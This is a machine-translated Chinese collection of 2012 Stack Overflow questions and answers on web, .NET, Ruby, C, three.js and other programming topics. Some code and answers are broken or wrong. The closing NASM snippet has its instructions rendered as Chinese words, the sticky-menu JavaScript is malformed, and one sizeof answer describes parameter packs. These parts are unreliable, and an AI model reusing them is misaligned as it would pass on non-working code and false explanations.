**演示**：http: [//jsfiddle.net/ur297/](http://jsfiddle.net/ur297/)

**代码**：

```
var hoverStyles = false;
$('.foo').hover(function() {
    hoverStyles = window.getComputedStyle(this);
    printStyles(hoverStyles );
}, function() {});

function printStyles(_styles) {
    console.log('Color: ' + _styles.color);
    console.log('Background Color: ' + _styles.backgroundColor);
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-30T07:41:22.100

```
 function getStyle(el,styleProp)
{
    var x = document.getElementById(el);
    if (x.currentStyle)
        var y = x.currentStyle[styleProp];
    else if (window.getComputedStyle)
        var y = document.defaultView.getComputedStyle(x,null).getPropertyValue(styleProp);
    return y;
} 
```

并获得像 font-size 这样的 css

```
getStyle(document.getElementById("container"), "font-size"); 
```

# biztalk - 在数据库服务器之间动态切换接收位置

> ID：12659439
> 
> 赞同：0
> 
> 时间：2012-09-30T07:16:36.480
> 
> 标签：biztalk, biztalk-2010

使用 BizTalk，我需要使用 ODBC 从托管在 Unix 中的两个数据库之一读取数据。

数据在数据库之间复制，如果其中一个数据库没有响应，我需要切换到另一个。没有负载平衡器或任何东西，所以我需要能够在 BizTalk 服务器上进行切换。

我正在考虑创建两个接收位置，一个用于每个数据库服务器，仅启用其中一个，然后有一个 Windows 服务定期尝试与其中一个数据库服务器建立连接，如果出现异常，请调用 powershell 脚本禁用不响应的服务器的接收位置并启用其他接收位置。

有没有更好的解决方案？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-30T17:24:15.567

我将按如下方式解决此问题：

*   在 Biztalk 中创建单个 http 接收位置。
*   创建windows服务
*   在windows服务中轮询第一个数据库，如果没有响应来自第二个数据库的轮询
*   让 Biztalk 服务将信息发布到 http 接收位置

您需要考虑如果两次读取相同的数据会发生什么情况，一次从主数据库读取，一次从备份读取。

# matlab - 如何将java的输出重定向到matlab

> ID：12659441
> 
> 赞同：0
> 
> 时间：2012-09-30T07:16:54.573
> 
> 标签：matlab, redirect, interface, jar

我有一个编译的 .JAR 文件，它获取两个数据集作为输入并产生一些分数（实数）。输出打印在控制台（cmd 提示符环境）中。但是我想在我的 matlab 代码中多次调用该函数。我无权访问 JAR 文件的源代码。是否有任何有效的方法（可能不是使用文件）将 jar 文件的结果返回给 matlab。

示例 JAR 输出：

* * *

一个：82.212 %

b: 0 %

c: 0.003 %

* * *

d: 13.471 %

e: 4.809 %

* * *

我想要这5个数字。它们始终以相同的格式打印。

有什么方法可以将这些结果重定向到例如 matlab 可以读取结果的 TCP/IP 端口？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-30T20:01:05.340

`result`使用函数的第二个输出`system()`。它将包含您需要解析的所需输出字符串。

```
[status, result] = system('command'); 
```

现在，假设您有`result`字符串，这里如何将其解析为值向量：

```
names = {'a', 'b', 'c', 'd', 'e'}';
values = nan(size(names));
for k = 1 : length(names)
    idx = strfind(result, names{k});
    assert(numel(idx) == 1);
    values(k) = sscanf(result(idx + length(names{k}) + 1 : end), '%f');
end 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-02T05:00:01.480

另一个要考虑的选择是将 JAR 链接到您的 Matlab 程序，方法是将其放在 javaclasspath 中。然后，您可以直接从您的 M 代码调用 JAR 中定义的任何公共对象的方法。如果有一个合适的入口点来计算这些值，您可以直接调用计算方法而不是通过 JAR 的`main`，并避免壳到一个单独的 JVM 进程和解析输出的开销。如果你最终调用它很多，它会更有效率。

# asp.net - 在 asp.net 上的 SOAP 中获取 Web 服务响应

> ID：12659444
> 
> 赞同：0
> 
> 时间：2012-09-30T07:18:02.543
> 
> 标签：asp.net, soap, web

我已经使用 .asmx 文件设置了一个 Web 服务，并且它的 Web 方法正在客户端通过 Ajax（全部使用 asp.net scriptmanager 等）调用。

当我调用 web 服务并查看回调中返回值的值时，它永远不是“SOAP”格式，即 xml。相反，该值以其原始形式返回。因此，例如，如果我从 web 服务返回一个字符串，则传递给我的成功回调的结果是该字符串，而不是编码或被 XML 标记包围。我怎样才能改变它，以便我能以 SOAP 格式看到它？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-19T05:34:59.173

你是从jquery打来的吗？可能以 Json 格式返回。我的猜测没有看到你的代码。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-12-03T17:44:41.500

听起来您正在返回 Web 服务函数的结果，并让 .NET 处理所有底层 SOAP 细节。如果您想在代码中看到 HTTP SOAP 响应，您需要做的不是引用 Web 服务并调用函数，而是发出 HTTP SOAP 请求。在 VB.NET 中：

```
Dim _soapRequest As String = "<?xml version=""1.0"" encoding=""utf-8""?>" & _
                             "<soap:Envelope xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns:soap=""http://schemas.xmlsoap.org/soap/envelope/"">" & _
                                "<soap:Body>" & _
                                "<CelsiusToFahrenheit xmlns=""http://tempuri.org/"">" & _
                                "<Celsius>" & 100 & "</Celsius>" & _
                                 "</CelsiusToFahrenheit>" & _
                                "</soap:Body>" & _
                                "</soap:Envelope>"
Dim response As String = DoRequestResponse(_soapRequest, "http://localhost:88/Service1.asmx") 
```

DoRequestResponse 函数看起来像这样

```
Public Function DoRequestResponse(ByVal _p_RequestString As String, ByVal _p_RequestURL As String) As String

    Dim _httpWebRequest As HttpWebRequest
    Dim _httpWebResponse As HttpWebResponse
    Dim _streamReq As Stream
    Dim _streamResp As Stream
    Dim _streamReader As StreamReader
    Dim _responseString As String
    Dim _bytesToWrite() As Byte

    Try
        _httpWebRequest = CType(WebRequest.Create(_p_RequestURL), HttpWebRequest)
        _httpWebRequest.Method = "POST"
        _httpWebRequest.ContentType = "text/xml"
        _httpWebRequest.Timeout = 30000
        Dim EncodingType As System.Text.Encoding = System.Text.Encoding.UTF8
        _bytesToWrite = EncodingType.GetBytes(_p_RequestString)

        _streamReq = _httpWebRequest.GetRequestStream()
        _streamReq.Write(_bytesToWrite, 0, _bytesToWrite.Length)
        _streamReq.Close()

        _httpWebResponse = DirectCast(_httpWebRequest.GetResponse(), HttpWebResponse)
        _streamResp = _httpWebResponse.GetResponseStream()

        _streamReader = New StreamReader(_streamResp)
        _responseString = _streamReader.ReadToEnd()

        _streamReader.Close()
        _httpWebResponse.Close()

    Catch ex As Exception
        Dim _ex As WebException = ex
        Console.Write(_ex.Status)
        Console.Write(DirectCast(_ex.Response, HttpWebResponse).StatusCode)
        Throw New Exception("DoRequestResponse Error :" & vbCrLf & ex.Message)
    End Try

    Return _responseString

End Function 
```

您可以在 asp.net 页面的代码隐藏中执行类似的操作，并从 AJAX、通过回发等方式调用它，然后将其发布到您的 .asmx Web 服务并返回 SOAP 响应。

# jquery - 如何对两个连接字段执行 jQuery 验证（需要检查凭据）？

> ID：12659457
> 
> 赞同：0
> 
> 时间：2012-09-30T07:21:17.423
> 
> 标签：jquery, ruby-on-rails, jquery-validate

我需要检查登录用户的电子邮件和密码是否正确，但是当我为一个字段调用远程时 - 我在 params 中没有其他字段值。

这是我检查凭据的操作：

```
def checkpass 
 user = User.find_by_email(params[:user][:email])
 logger.debug "User: #{params[:user][:email]}"
 logger.debug "Pass: #{params[:user][:password]}"
 logger.debug "Devise pass:#{user.valid_password?(params[:user][:password])}"
   respond_to do |format|
    if user && user.valid_password?(params[:user][:password])
     format.json { render :json => user }
    end
  end
end 
```

jQuery 验证（**编辑**）：

```
 'user[password]': {
            required: true,
            minlength: 6,
            remote: {
            url: "http://127.0.0.1:3000/checkpass",
            type: "get",
            data: {
              email: function() { return $("#user_email").val(); }
            }
        } 
```

**日志**

```
 Processing by EditUserController#checkpass as JSON
      Parameters: {"user"=>{"password"=>"[FILTERED]"}, "email"=>"user@mail.com", "pa
       ssword"=>"[FILTERED]"}
      ←[1m←[35mUser Load (0.0ms)←[0m  SELECT "users".* FROM "users" WHERE "users"."e
       mail" IS NULL LIMIT 1
        User:
       Pass: 123456 
```

我怎样才能同时获得 params[:email] 和 params[:password] ？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-30T07:41:52.767

好吧，根据你的表格结构......

**(1)**第一个要填写的字段将是电子邮件字段。

**(2)**第二个要填写的字段是密码一。

**(3)**由于未知原因，用户首先在密码字段中输入信息，然后远程验证插件必须检测电子邮件字段未完成或无效。

使用这种逻辑，远程方法必须在密码字段中检查电子邮件，最终知道所有登录数据是否正确。

你可以做的事情，可以在这里找到：

[jquery远程验证：将远程数据传递给函数](https://stackoverflow.com/questions/10337144/jquery-remote-validation-pass-remote-data-to-funcion)

# performance - 使用three.js和画布渲染器渲染大量彩色粒子

> ID：12659461
> 
> 赞同：10
> 
> 时间：2012-09-30T07:22:30.117
> 
> 标签：performance, 3d, three.js

我正在尝试使用 Three.js 库在屏幕上显示大量彩色点（例如大约一百万到一百万）。如果可能，我正在尝试使用 Canvas 渲染器而不是 WebGL 渲染器（网页也将显示在 Google 地球客户端气泡中，这似乎适用于 Canvas 渲染器，但不适用于 WebGL 渲染器。）

[**虽然我通过从这里**](http://mrdoob.github.com/three.js/examples/canvas_particles_random.html)修改代码解决了少量点（数万点）的问题，但我在扩展它时遇到了麻烦。

但在下面使用 WebGL 和粒子系统的代码中，我可以渲染半百万个随机点，但没有颜色。

```
 ...
var particles = new THREE.Geometry();
var pMaterial = new THREE.ParticleBasicMaterial({
                    color: 0xFFFFFF,
                    size: 1,
                    sizeAttenuation : false
                    });

// now create the individual particles
for (var p = 0; p < particleCount; p++) {
     // create a particle with randon position values,
     // -250 -> 250
     var pX = Math.random() * POSITION_RANGE - (POSITION_RANGE / 2),
     pY = Math.random() * POSITION_RANGE - (POSITION_RANGE / 2),
     pZ = Math.random() * POSITION_RANGE - (POSITION_RANGE / 2),
     particle = new THREE.Vertex(
                        new THREE.Vector3(pX, pY, pZ)
                        );

     // add it to the geometry
     particles.vertices.push(particle);
    }

    var particleSystem = new THREE.ParticleSystem(
                            particles, pMaterial);
    scene.add(particleSystem);
  ... 
```

上面的代码性能更好的原因是粒子系统吗？从我在文档中阅读的内容来看，粒子系统似乎只能由 WebGL 渲染器使用。

所以我的问题是

a) 我可以使用 Canvas 渲染器渲染如此大量的粒子，还是它总是比 WebGL/ParticleSystem 版本慢？如果是这样，我该怎么做？我使用哪些对象和/或技巧来提高性能？

b) 如果我放弃某些功能，我可以达成妥协吗？换句话说，如果我放弃为单个点着色的需要，我还能将 Canvas 渲染器用于大型数据集吗？

c) 如果我必须放弃 Canvas 并使用 WebGL 版本，是否可以更改各个点的颜色？似乎颜色是由传递给 ParticleSystem 的材料设置的，它设置了所有点的颜色。

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-09-30T18:31:36.477

编辑：`ParticleSystem`并`PointCloud`已重命名为`Points`. 此外，`ParticleBasicMaterial`和`PointCloudMaterial`已重命名为`PointsMaterial`。

要为每个粒子设置不同的颜色，您需要将颜色数组作为几何体的属性，然后在材质中设置`vertexColors`为，如下所示：`THREE.VertexColors`

```
// vertex colors
var colors = [];
for( var i = 0; i < geometry.vertices.length; i++ ) {

    // random color
    colors[i] = new THREE.Color();
    colors[i].setHSL( Math.random(), 1.0, 0.5 );

}
geometry.colors = colors;

// material
material = new THREE.PointsMaterial( {
    size: 10,
    transparent: true,
    opacity: 0.7,
    vertexColors: THREE.VertexColors
} );

// point cloud
pointCloud = new THREE.Points( geometry, material ); 
```

这是一个更新的小提琴：http: [//jsfiddle.net/J7zp4/200/](http://jsfiddle.net/J7zp4/200/)

您的其他问题对我来说有点太笼统了，此外，这取决于您要做什么以及您的要求是什么。是的，您可以预期 Canvas 会更慢。

编辑：更新为three.js r.73

# jquery - 将菜单保持在固定位置

> ID：12659465
> 
> 赞同：0
> 
> 时间：2012-09-30T07:23:19.427
> 
> 标签：jquery, html, css, menu

所以我在这里有这个 html 布局

![在此处输入图像描述](../Images/ad0fa0901596f50bdf9cf34a73109678.png)

我需要的是红色框中的那个菜单随着页面向下移动而向下移动，但是当我返回时我不会超过现在的位置，它的代码是这样的一点CSS

```
 <div id="sidebar">
            <div class="sidebarbox">
               <h2>Menu</h2>
                <ul class="sidemenu">
                    <li><a href="index.html">Home</a></li>
                    <li><a href="about me.html">About me</a></li>
                    <li><a href="about.html">---------</a></li>
                    <li><a href="development.html">Development</a></li>
                    <li><a href="future development.html">Future Development</a></li>
                    <li><a href="video.html">Video Explaination</a></li>
                    <li><a href="java.html">Java Files</a></li>
                    <li><a class="bold" href="downloads.html">Downloads</a>
                        <ul>
                            <li><a href="#source">Source Code</a></li>
                            <li><a href="#text">Text Files</a></li>
                            <li><a href="#pdfs">PDFs</a></li>
                            <li><a href="#images">Images</a></li>
                        </ul>
                    </li>
                </ul>
            </div>
        </div> 
```

CSS：

```
#sidebar{background:transparent url('images/sidebar-top.jpg') no-repeat scroll top left;float:right;width:25%;}
#sidebar .sidebarbox {margin:0 0 25px 0;background-color:#fff; border:1px solid #467aa7;}
#sidebar p{margin:10px 0 10px 10px;}
#sidebar ul{list-style:none;margin:10px 0 10px 10px;padding:0;}
#sidebar ul li{margin:0 0 5px 0;}
#sidebar ul li a{color:#467aa7;font-weight:400;}
#sidebar ul.sidemenu {margin:0;}
#sidebar ul.sidemenu li{display:inline;padding:0;margin:0;}
#sidebar ul.sidemenu li a{display:block;padding:7px 5px 6px 10px;font-size:1.2em; font-weight:400;text-decoration:none;border-bottom:1px solid #ddd;}
#sidebar ul.sidemenu li a:hover{background-color:#eee;color:#333;border-bottom:1px solid #ccc;}
#sidebar ul.sidemenu li .bold{font-weight:bold;}
#sidebar ul.sidemenu ul{margin:0;padding:0;font-size:0.9em;border-bottom:1px solid #ccc;}
#sidebar ul.sidemenu ul li a{padding:5px 5px 5px 25px;border:0;font-weight:400;}
#sidebar ul.sidemenu ul li a:hover{border:0;}
#sidebar ul li a:hover{color:#333;}
#sidebar h2{background-color:#467aa7;color:#fff;font-size:1.5em;margin:0 0 0 0;padding:10px;}
#sidebar h3{font-size:1.4em; padding:10px 10px 0 10px;} 
```

你会用 js 还是 jquery 来做这个？或者有没有更简单的方法？

**我不希望它固定位置，它不会做我想做的事，我希望它在某些部分保持固定，但不是当我在页面顶部时，我希望它回到原来的位置**

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-30T07:31:26.113

使用 CSS 固定位置

```
.sidemenu{
position:fixed;
} 
```

因此，如果您想在页面顶部再次获得原始位置，则

将此代码添加到javascript文件

```
$("document").ready(function(){
 For IE:

   var X - window.screenLeft
   var Y - window.screenTop

    For everything else:

    var X - window.screenX
    var Y - window.screenY
//use something like this
if(Y==0 && X==0){
$(".submenu").css("position","absolute");
}else if( Y>0){
$(".submenu").css("position","fixed");
}

}) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-30T07:39:45.937

您可以通过使侧边栏固定位置来做到这一点

```
#sidebar{
   position:fixed;

} 
```

并且js方法在@johnraymos答案中

# c++ - 通过 USB 编程访问多个网络摄像头

> ID：12659467
> 
> 赞同：1
> 
> 时间：2012-09-30T07:23:46.980
> 
> 标签：c++, opencv, usb, webcam, libusb

我想用至少 3 个网络摄像头的输入构建我的场景的 3D 视图...目前我在 Windows 7 32 位平台上使用 OpenCV（使用 C/C++），它最多可以并行提供 2 个网络摄像头视图。 .我已经生成了一个带有 2 个网络摄像头的 3D 视图，但这还达不到标准......所以我有以下问题......

1.  如果我在 USB 集线器中使用 3 个网络摄像头 (2.0)，是否可以在没有 OpenCV 的情况下访问 USB 视频帧？如果是，那么如何？为了简单起见，我可以跳过 USB 集线器，因为我的笔记本电脑有 3 个 USB 端口……是那么可能吗？
2.  我已经阅读了有关 LIBUSB 库的信息...尚未使用它...是否可以使用这种 USB 库访问网络摄像头视频帧？
3.  LIBUSB 库的安全性如何？我在一些论坛上读到，如果没有正确配置和使用，蓝屏会非常频繁地弹出……它也有可能损坏 USB 驱动程序……？还有其他我可以安全使用的 USB 库吗？

任何从事过类似 USB 多个网络摄像头访问的人或对此有任何想法的人请指导我...欢迎任何建议...

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-30T08:00:30.407

1.  您可以在 USB 带宽允许的范围内运行尽可能多的网络摄像头
2.  如果达到 USB 带宽限制，您不太可能通过使用某些软件库来解决此问题
3.  如果存在此类选项，则降低分辨率或开始使用相机压缩可能会有所帮助，因为两者都会减少 USB 流量

有关 USB 带宽限制的更多链接：[2 个 USB 摄像头不适用于 opencv](https://stackoverflow.com/questions/11222813/2-usb-cameras-not-working-with-opencv)

# ruby - 不能将所有或大多数情况下的“每个”替换为“地图”吗？

> ID：12659471
> 
> 赞同：5
> 
> 时间：2012-09-30T07:24:20.323
> 
> 标签：ruby, map, each

`Enumerable#each`和之间的区别在于`Enumerable#map`它是返回接收者还是映射的结果。回到接收者是微不足道的，你通常不需要在`each`like之后继续一个方法链`each{...}.another_method`（我可能没有见过这种情况。即使你想回到接收者，你也可以用 来做到这一点`tap`）。所以我认为使用的所有或大多数情况`Enumerable#each`都可以替换为`Enumerable#map`. 我错了吗？如果我是对的，这样做的目的是`each`什么？`map`比 慢吗`each`？

**编辑**：我知道`each`当您对返回值不感兴趣时​​，可以使用一种常见的做法。我对这种做法是否存在不感兴趣，但对这种做法是否有意义，而不是从惯例的角度来看感兴趣。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-30T12:09:17.583

`map`和之间的区别`each`比一个返回一个新数组而另一个不返回更重要。重要的区别在于它们如何传达您的意图。

当您使用 时`each`，您的代码会显示“我正在为每个元素做一些事情”。当您使用 时`map`，您的代码会显示“我正在通过转换每个元素来创建一个新数组”。

因此，尽管您可以使用`map`, 来代替`each`性能，但代码现在会向任何阅读它的人撒谎。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-09-30T10:15:05.880

`map`之间的选择`each`应该由所需的最终结果决定：新数组或没有新数组。的结果`map` 可能是巨大的和/或愚蠢的：

```
p ("aaaa".."zzzz").map{|word| puts word} #huge and useless array of nil's 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-30T07:51:47.123

我同意你所说的。`Enumerable#each`只需返回调用它的原始对象，同时`Enumerable#map`将当前迭代的元素设置为块的返回值，然后返回具有这些更改的新对象。

由于简单地返回原始对象本身，因此在您需要简单地迭代或遍历元素的情况下`Enumerable#each`，它可能是非常受欢迎的。`map`

事实上，`Enumerable#each`这是进行传统 for 循环迭代的一种简单而通用的方法，并且在 Ruby 中每个循环都比 for 循环更受欢迎。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-30T13:10:51.950

`map`您可以看到编写这些枚举器之间以及编写这些枚举器时的显着差异`each`。

例如，您需要获取带有索引的新数组：

```
array.each.with_index.map { |index, element| [index, element] } 
```

或者例如你只需要对数组中的所有元素应用一些方法并打印结果而不改变原始数组：

```
m = 2.method(:+)

[1,2,3].each { |a| puts m.call(a) } #=> prints 3, 4, 5 
```

还有很多其他示例，其中 和 之间的区别`each`是`map`编写函数式代码的重要关键。

# c# - 如何使用 HTMLAgilityPack 在嵌套 div 中查找字符串

> ID：12659472
> 
> 赞同：-1
> 
> 时间：2012-09-30T07:24:28.460
> 
> 标签：c#, visual-studio-2010, .net-4.0, html-agility-pack, windows-applications

有一个如下的html代码：

```
<div class="class1 class2 class3">
  <div class="class4 class5">
    <span class="class6">GOAL STRING</span>
  </div>
</div> 
```

现在我想`GOAL STRING`从 HTMLAgilityPack 中找到那个用途。
我怎样才能做到这一点？
[使用**LINQ**和不使用**LINQ** = 请向我们展示两种方式]

提前致谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-30T07:33:17.030

那么您可以使用 xpath 直接获取跨度。

```
document.DocumentNode.SelectSingleNode("//div[@class='class1 class2 class3']/div[@class='class4 class5']/span[@class='class6']").InnerText; 
```

这是 xpath 的一个很好的资源，特别是页面中间的表格：http: [//www.codeproject.com/Articles/9494/Manipulate-XML-data-with-XPath-and-XmlDocument-C](http://www.codeproject.com/Articles/9494/Manipulate-XML-data-with-XPath-and-XmlDocument-C)

同样在 Google Chrome 上，您可以右键单击 -> 检查元素，然后右键单击树上显示的元素，然后单击复制为 Xpath 以获得起点。这些表达式通常可以简化。

# css - 如何减小 TTF 文件的大小？

> ID：12659475
> 
> 赞同：0
> 
> 时间：2012-09-30T07:25:11.000
> 
> 标签：css, font-face, truetype

我正在为我的网站使用字体方法。为此我正在使用 TTF 文件。面临的问题是由于 TTF 文件的大小导致网站加载缓慢。所以建议我如何减小 TTF 文件的大小。谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-11T03:21:55.860

您可以查看您在字体中使用的字形数量并尝试将其减少到绝对必要的字形，[字体松鼠套件生成器](http://www.fontsquirrel.com/fontface/generator)在专家模式下可让您选择要使用的符号。

阅读更多[关于限制 Webfont 的字符集？](https://stackoverflow.com/questions/10732372/limit-characterset-of-a-webfont)

# svg - 移动 Safari 无法滚动到命名锚点

> ID：12659477
> 
> 赞同：1
> 
> 时间：2012-09-30T07:25:28.520
> 
> 标签：svg, scroll, mobile-safari, anchor

我[这里](http://b2tf.com/mm.svg)有一个很大的 SVG 文档，其中包含某个在线游戏中所有任务的地图。每个任务节点都在一个 SVG 中`<a>`元素，链接到在另一个选项卡中加载的大型 HTML 文档中的不同命名锚点，其中包含有关该特定任务的更多详细信息。这在桌面 Safari 中完全符合预期，我希望它在任何支持 SVG 的浏览器中都能正常工作，因为我只使用最基本的链接形式，但在 Mobile Safari (iOS 6) - 这是我最重要的浏览器目标，考虑到有问题的游戏是针对 iPad 的。它只会在 HTML 页面的初始加载时滚动到正确的锚点；单击 SVG 选项卡中的不同任务将导致切换到 HTML 选项卡，并且地址栏中的哈希（片段 ID）会更改，但页面不会自动滚动。

这似乎是 Mobile Safari 中的一个已知限制 - URL 中的仅哈希更改显然用于强制页面重新加载，并且已过度修复，以至于现在根本不会触发任何内容。我在网上找到的所有修复似乎都只适用于以编程方式从同一文档中生成 URL 更改的情况，而不是来自不同文档的静态链接。

更多详细信息：

*   我已经尝试过以旧`<a name="...">`形式和新`<h1 id="...">`形式进行命名锚点。没有不同。
*   我尝试添加一个`onhashchange`处理程序，以强制进行滚动，但根本没有调用该处理程序（通过在其中放置一个 alert() 来验证）。
*   我大概可以通过将每个任务的详细信息放在一个单独的 HTML 文件中来解决这个问题，但这会严重影响可用性 - 将所有详细信息放在一个文件中，您可以使用浏览器的查找功能一次搜索它们。（此外，每次更新后将 1006 个文件部署到我的虚拟主机会有点痛苦......）

有人有解决方法的想法吗？

# iphone - 是否必须提交兼容 iPad 的应用程序版本

> ID：12659479
> 
> 赞同：0
> 
> 时间：2012-09-30T07:25:36.650
> 
> 标签：iphone, ios, ipad, app-store

我即将提交我的 iPhone 应用程序以供审核。刚刚通过[https://developer.apple.com/appstore/resources/approval/guidelines.html](https://developer.apple.com/appstore/resources/approval/guidelines.html)上的批准指南。

> 2.10 iPhone 应用程序还必须在 iPad 上以 iPhone 分辨率和 2X iPhone 3GS 分辨率运行，无需修改

这是什么意思？到目前为止，我还没有包含任何 iPad 功能。我也没有任何适用于 iPad 的图形。我不打算为 iPad 发布它。（不是我想限制它，但我从来没有计划过，而且我认为就我的应用程序而言没有必要）

我该怎么办？是否必须使其成为“通用”应用程序？如果是，我应该确保什么？如果不是，我应该确保就 Apple 要求而言满足上述 2.10 的要求？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-30T07:30:04.513

不可以。正如指南所说，它必须*以 iPhone 分辨率和 2X iPhone 分辨率*运行。也就是说，在 iPad 的兼容模式下。

这意味着您应该在 iPad 上安装您的应用程序并检查它是否有任何特殊之处可能使其在该模式下不兼容。在实践中，这意味着在大多数情况下都不必费心去做：你必须*非常*努力地使 iPhone 应用程序与 iPad 不兼容。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-30T07:30:30.300

使其具有普遍性并不是强制性的。

尝试下载仅限 iphone 的应用程序并在 ipad 上打开它。

它看起来像这样。

![在此处输入图像描述](../Images/292a8285126a0e62c7c6161b1438e300.png) ![在此处输入图像描述](../Images/e069df0c872aaf60160641385eacd613.png) 您只是为了确保它在 iPad 上正常启动和运行

# c# - Visual Studio 2012 自动生成的代码与应用程序代码冲突

> ID：12659480
> 
> 赞同：1
> 
> 时间：2012-09-30T07:25:44.577
> 
> 标签：c#, .net, visual-studio-2012

我对使用 VS2012 真的很陌生，但是我遇到了一个非常大的问题，那就是使开发变得不可能。每次我更改一些代码时，都会与 VS2012 自动生成的用于调试的代码（ project\obj\Release\filename.gicss ）发生冲突。就像有源文件的幽灵副本，VS2012 将它们作为项目文件拾取并导致大量声明错误（因为它检测到它们在两个地方声明，即使它在技术上是相同的文件）。

因此，如果我更改 Main.xaml.cs 并保存，VS2012 会生成 Main.gicss，告诉我源文件已在 VS2012 之外更改，并且 Main.gicss 充满了我没有放在那里的一堆代码，这是在其来源的顶部：

此代码是由工具生成的。运行时版本：4.0.30319.17929 对此文件的更改可能会导致不正确的行为，并且如果重新生成代码将会丢失。

我已经在选项中关闭了文件自动重新加载。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-30T07:29:14.733

不要将`*.g.*`文件添加到 Visual Studio 项目。它们会自动包含在构建过​​程中，这可能就是您看到重复和冲突的原因。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-30T07:31:43.523

我记得也遇到过这个问题。我认为点击 Build -> Clean 和删除 obj/ 文件夹的组合最终解决了我的问题。

# android - 自定义列表视图项目的外观

> ID：12659484
> 
> 赞同：1
> 
> 时间：2012-09-30T07:26:15.430
> 
> 标签：android, listview, textview

我实现了一个 ListView 来显示书籍的文本。这样每段文字都是ListView中的一个item（TextView）。但是我不希望在它们集中或选择并单击它们时将它们彼此区分开来。所以，我用于`<selector>`ListView；但我可以自定义项目的背景！

现在，如果我想自定义列表项的前景，如文本颜色，我该怎么办？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-30T07:39:58.767

您可以为列表项创建自己的 xml 布局并将其放入适配器中。例如，`SimpleAdapter`构造函数看起来像这样：

```
SimpleAdapter adapter = new SimpleAdapter(context, list, R.layout.your_item_style, from, to) // where "your_item_style" is name of xml file in layout folder of your app 
```

# xapian - 在 xapian c++ 库中添加字段

> ID：12659485
> 
> 赞同：0
> 
> 时间：2012-09-30T07:26:23.843
> 
> 标签：xapian

您好，我正在尝试 xapian c++ 库，我基本上来自 java，我使用了 lucene，现在我需要 xapian，我别无选择。所以我正在使用它。在 lucene 中我们可以这样使用

```
Document doc = new Document();
    doc.add(new Field("title", "stackoverflow", Field.Store.YES, Field.Index.ANALYZED));
    w.addDocument(doc); 
```

所以标题包含值。但是从这个例子

```
Xapian::Document newdocument;
newdocument.set_data(string("stackoverflow"); 
```

如何在 xapian 中制作同样的东西。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-01T12:38:09.907

Xapian 与 Lucene 不同，它不限制您如何使用文档数据。它只允许为每个文档存储任何二进制数据——尽管这在某种程度上是一个缺失的特性，但它也提供了更大的灵活性，这意味着有些人可以使用 JSON，有些人可以使用简单的键值序列化等等。当然，缺点是您必须决定如何序列化数据。

Omega 中有一些代码使用简单的键值序列化可能会有所帮助。或者，您可以查看诸如 restpose 之类的东西，它提供了一种基于 Xapian 构建的更高级别的搜索方法，并且与 Solr 更具可比性。

# c - sizeof (function(argument)) 返回什么？

> ID：12659486
> 
> 赞同：7
> 
> 时间：2012-09-30T07:26:35.150
> 
> 标签：c, sizeof

程序的输出是什么

```
#include <stdio.h>

int fun(char *a){
    printf("%d\n",sizeof(a));
    return 1;
}

int main(){
    char a[20];
    printf("%d\n",sizeof (fun(a)));
    return 0;
} 
```

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-09-30T07:29:18.927

除可变长度数组外，`sizeof`不计算其操作数。所以它只会产生`fun(a)`类型的大小，*即* `sizeof(int)`（不调用函数）。

> **C11 (n1570) §6.5.3.4`sizeof`和`_Alignof`运算符**
> 
> 2 [...] 如果操作数的类型是可变长度数组类型，则计算操作数；否则，不计算操作数，结果是一个整数常量。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-09-30T07:28:53.080

它从该函数返回返回类型的大小（`4`在我的实现中，因为这是我所`int`占用的），如果您按原样运行它，您会发现它，然后将返回类型更改为`char`（此时它会给您`1`）。

C99标准的相关部分是`6.5.3.4.The sizeof operator`：

> sizeof 运算符产生其操作数的大小（以字节为单位），它可以是表达式或带括号的类型名称。大小由操作数的类型决定。结果是一个整数。如果操作数的类型是变长数组类型，则计算操作数；**否则，不计算操作数**，结果是一个整数常量。

请记住，粗体字表示函数本身*没有*被调用（因此`printf`它的内部没有被执行）。换句话说，输出只是你的`int`类型的大小（当然，后跟换行符）。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-09-30T07:30:04.670

该函数返回`int`，所以它是`sizeof(int)`，在 32 位系统上通常是 4 个字节。虽然它可能是 2 或 8，具体取决于实现。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-30T07:29:14.717

关键字 sizeof 后跟省略号返回参数包中的元素数。

结果的类型是头文件中定义的无符号整数类型size_t

# assembly - 使用变量组装

> ID：12659488
> 
> 赞同：1
> 
> 时间：2012-09-30T07:27:09.117
> 
> 标签：assembly, x86, nasm

我正在尝试使文本屏幕打印存储在变量中的“h”。我正在使用 NASM。x86 保护模式，一个从头开始的内核。

```
显示消息：
        ;mov 字节[颜色], 0xF
        ;mov CFC, EAX;
        ;mov 字节[颜色], 104
        ;推104
        ;mov 字节[esi], 消息
        ;lodsb
        mov ebx, 消息
        添加 ebx, 4
        mov [消息], eax
        移动字节[0xB8000]，消息
        ;mov byte[eax], 颜色
        ;弹出字节[0xB8000]
        ;mov byte[0xB8000], 字节颜色
